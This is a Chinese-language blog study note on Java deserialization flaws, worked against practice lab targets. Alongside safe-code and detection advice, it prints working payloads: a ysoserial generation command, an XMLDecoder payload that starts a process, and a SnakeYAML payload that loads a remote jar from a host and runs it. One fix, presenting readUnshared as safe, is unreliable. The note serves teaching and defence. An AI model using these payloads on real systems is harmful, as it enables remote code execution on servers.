---
title: javasec-反序列化
date: 2024-08-01T22:16:09
lastmod: 2025-09-29T20:53:07
tags:
  - sec
toc: "true"
---
# 反序列化
序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，
java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，

JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。
## 前置知识

### 为什么要序列化?
对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。

Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。

反序列化条件：
- 该类必须实现 java.io.Serializable 对象
- 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的序列化过程：

1. 序列化：将 OutputStream 封装在 ObjectOutputStream 内，然后调用 writeObject 即可
2. 反序列化：将 InputStream 封装在 ObjectInputStream 内，然后调用 readObject 即可反序列化出错可能原因
3. 序列化字节码中的 serialVersionUID(用于记录java序列化版本)在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException

### ObjectOutputStream
java.io.ObjectOutputStream 类，将Java对象的原始数据类型写出到文件,实现对象的持久存储。

一个对象要想序列化，必须满足两个条件:
1.该类必须实现 java.io.Serializable 接口， Serializable 是一个标记接口，不实现此接口的类将不会
使任何状态序列化或反序列化，会抛出 NotSerializableException 。
2.该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态的，使用transient 关键字修饰。

示例:
```java Employee.java
 public class Employee implements java.io.Serializable{
 public String name;
 public String address;
 public transient int age; // transient瞬态修饰成员,不会被序列化
 public void addressCheck() {
   System.out.println("Address check : " + name + " -- " + address);
 //此处省略tostring等方法
 }
}
```

```java SerializeDemo.java
public class SerializeDemo {
 public static void main(String[] args) throws IOException {
   Employee e = new Employee();
   e.name = "zhangsan";
   e.age = 20;
   e.address = "shenzhen";
     // 创建序列化流
     ObjectOutputStream outputStream = new ObjectOutputStream(new
FileOutputStream("ser.txt"));
     // 写出对象
     outputStream.writeObject(e);
     // 释放资源
     outputStream.close();
 }
}
```

### ObjectInputStream
如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的方法

```bash
ObjectInputStream.readObject()：任何类如果想要序列化必须实现java.io.Serializable接口
```

### 原生序列化类函数

```bash
-SnakeYaml：完整的YAML1.1规范Processor，支持Java对象的序列化/反序列化
-XMLDecoder：xml语言格式序列化类函数接口
-ObjectInputStream.readObject()：任何类如果想要序列化必须实现java.io.Serializable接口
```

## 涉及工具
靶机平台还是这两个
- [Hello-Java-Sec](https://github.com/j3ers3/Hello-Java-Sec)
- [JavaSec](https://github.com/bewhale/JavaSec)

利用工具,后面两个工具集成了第一个
```bash
https://github.com/frohoff/ysoserial
Yakit https://yaklang.com/
https://github.com/NotSoSecure/SerializedPayloadGenerator
```

## 漏洞基本原理
在Java反序列化中，会调用被反序列化对象的readObject方法，当readObject方法被**重写不当**时产生漏洞

此处重写了readObject方法，执行Runtime.getRuntime().exec(),
defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法

运行流程：
1.People对象序列化进object文件
2.object文件反序列化对象->调用自身的readObject方法->执行Runtime.getRuntime().exec("calc.exe");

```java
    public People(String name, String sex, int age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
```
接着重写readObject方法.
```java
private void readObject(ObjectInputStream objInputStream) throws IOException, ClassNotFoundException {
        // 先调用默认的反序列化方法，即readObject
        objInputStream.defaultReadObject();
        // 再执行自己的代码逻辑，例如执行系统命令
        Runtime.getRuntime().exec("calc.exe");
    }
```
然后去进行序列化
```java
public static void main(String [] args) throws IOException, ClassNotFoundException {
	People people = new People("ZhangSan", "boy", 18);
	// 先序列化People对象
	byte[] byteStream = SerializeDemo.Serialize(people);
	// 再反序列化
	SerializeDemo.DeSerialize(byteStream);
}
```

共同条件：继承 Serializable
- 入口类 source （即找到,重写readObject方法，调用常见的函数，参数类型宽泛 最好 jdk 自带）
- 调用链 gadget chain （基于类的默认方式调用）
- 执行类 sink （RCE、SSRF、写文件等操作）

## 漏洞分析
### 漏洞代码
靶机平台上的
#### ObjectInputStream
```java
// readObject，读取输入流,并转换对象。ObjectInputStream.readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象。
// 生成payload：java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 "open -a Calculator" | base64

public String cc(String base64) {
    try {
        base64 = base64.replace(" ", "+");
        byte[] bytes = Base64.getDecoder().decode(base64);

        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);

        // 反序列化流，将序列化的原始数据恢复为对象
        ObjectInputStream in = new ObjectInputStream(stream);
        in.readObject();
        in.close();
        return "反序列化漏洞";
    } catch (Exception e) {
        return e.toString();
    }
}
```
ObjectInputStream.readObject,将对象给恢复,调用恢复对象的readObject方法,执行命令
![|600](https://img.l1uyun.one/javasec-反序列化_image_1.png)

#### XMLDecoder
也是一样的,只不过是换成了xmldecode.readObject
```java
// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容

String path = "src/main/resources/payload/calc-1.xml";
File file = new File(path);
FileInputStream fis = null;
try {
    fis = new FileInputStream(file);
} catch (Exception e) {
    e.printStackTrace();
}

BufferedInputStream bis = new BufferedInputStream(fis);
XMLDecoder xmlDecoder = new XMLDecoder(bis);
xmlDecoder.readObject();
xmlDecoder.close();
```
传输的数据是xml格式
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_151" class="java.beans.XMLDecoder">
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>cmd</string>
            </void>
            <void index="1">
                <string>/c</string>
            </void>
            <void index="2">
                <string>calc</string>
            </void>
        </array>
        <void method="start" />
    </object>
</java>

```
![](https://img.l1uyun.one/javasec-反序列化_image_2.png)
#### SnakeYaml
SnakeYAML 反序列化,
SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行.
```java
// 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控

public void yaml(String content) {
    Yaml y = new Yaml();
    y.load(content);
}
```
只不过传输的数据不是object格式了,而是yaml格式
使用了[yaml-payload](https://github.com/artsploit/yaml-payload)这个工具,编译得到一个payload.jar,放在wsl里面,并且开一个web服务器.
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://192.168.10.7:8000/yaml-payload.jar"]
  ]]
]
```
![](https://img.l1uyun.one/javasec-反序列化_image_3.png)

### 安全代码
#### 黑白名单

```java
// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制

public String safe(String base64) {
    try {
        base64 = base64.replace(" ", "+");
        byte[] bytes = Base64.getDecoder().decode(base64);

        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);
        ValidatingObjectInputStream ois = new ValidatingObjectInputStream(stream);

        // 只允许反序列化Student class
        ois.accept(Student.class);
        ois.readObject();

        return "ValidatingObjectInputStream";
     } catch (Exception e) {
        return e.toString();
}
```
#### SnakeYaml安全构造器
```java
// SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。

public void safe(String content) {
    Yaml y = new Yaml(new SafeConstructor());
    y.load(content);
    log.info("[safe] SnakeYaml反序列化: " + content);
}
```

## 漏洞修复
 1. 更新commons-collections、commons-io等第三方库版本。
 2. 不要使用可以执行任意代码的类型进行反序列化。例如，不要使用 ObjectInputStream.readObject 方法进行反序列化，而应该使用安全的反序列化方法，例如 ObjectInputStream.readUnshared 方法。
 3. 对于来源不可信的序列化数据，不要直接进行反序列化，而应该先进行校验，确保它不存在恶意代码。例如，可以对序列化数据的长度、格式进行校验，避免反序列化漏洞的发生。
## 漏洞发现
黑盒发现（流量捕获）
白盒发现（特征类接口函数）
### 白盒
看是否用到了这些库,以及上面那些函数吧
![](https://img.l1uyun.one/javasec-反序列化_image_4.png)
### 黑盒
黑盒的话看流量,看特征码
java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，

burp插件
![|600](https://img.l1uyun.one/javasec-反序列化_image_5.png)

需要配置一下ysoserial(一款java反序列化漏洞payload生成器)的路径

# 一句话总结
反序列化时会调用被反序列化对象的readObject方法,当这个方法被重写后,就会导致漏洞产生

# 参考
[Java反序列化基础篇-01-反序列化概念与利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/333697.html)

[java反序列化漏洞专项 - 飘渺红尘✨ - 博客园](https://www.cnblogs.com/piaomiaohongchen/p/16447244.html)

[JAVA安全-序列化与反序列化基础详解](https://xz.aliyun.com/t/13060?time__1311=GqmhBK4GxRhx%2FWNiQo40IFqWuxiw5pD)
